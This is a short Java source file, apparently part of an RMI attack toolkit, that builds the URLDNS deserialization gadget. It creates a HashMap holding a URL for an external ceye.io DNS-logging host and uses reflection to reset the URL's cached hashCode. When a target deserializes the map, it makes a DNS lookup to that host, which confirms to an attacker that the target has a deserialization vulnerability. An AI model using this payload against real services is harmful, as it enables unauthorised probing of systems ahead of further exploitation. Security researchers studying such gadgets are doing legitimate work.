package run.ergou.rmi.util;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class CreateURLDNS {
    public static HashMap create() throws Exception {
        HashMap hashMap = new HashMap();
        String spec = "http://v3vbk7.ceye.io";
        URL url = new URL(spec);
        Class<? extends URL> urlClass = url.getClass();
        Field hashCode = urlClass.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url, 0);
        hashMap.put(url, null);
        hashCode.set(url, -1);
        return hashMap;
    }
}
